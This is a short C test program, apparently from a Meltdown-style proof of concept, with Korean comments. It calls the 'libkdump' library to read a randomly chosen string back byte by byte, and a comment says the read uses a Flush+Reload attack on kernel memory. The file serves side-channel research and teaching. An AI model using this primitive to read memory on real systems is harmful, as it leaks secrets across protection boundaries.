#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

const char *strings[] = {
    "If you can read this, at least the auto configuration is working",
    "Generating witty test message...",
    "Go ahead with the real exploit if you dare",
    "Have a good day.",
    "Welcome to the wonderful world of microarchitectural attacks",
    "Pay no attention to the content of this string",
    "Please wait while we steal your secrets...",
    "Would you like fries with that?",
    "(insert random quote here)",
    "Don't panic...",
    "Wait, do you smell something burning?",
    "How did you get here?"};

int main(int argc, char *argv[]) {
  // libkdump의 기본 환경설정을 불러온다.
  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  libkdump_init(config);

  // 임의의 문자열을 가져오는 부분. 
  srand(time(NULL));
  const char *test = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];
  int index = 0;

  // \x1b ... 은 terminal 의 색상을 설정한다. (초록, 노랑)
  printf("Expect: \x1b[32;1m%s\x1b[0m\n", test);
  printf("   Got: \x1b[33;1m");
  
  // libkdump_read 함수는 flush_reload 공격을 이용하여 커널 메모리에 액세스한다.
  while (index < strlen(test)) {
    int value = libkdump_read((size_t)(test + index));
    printf("%c", value);
    fflush(stdout);
    index++;
  }
  // 작업에 사용된 메모리 등을 해제 
  printf("\x1b[0m\n");
  libkdump_cleanup();

  return 0;
}
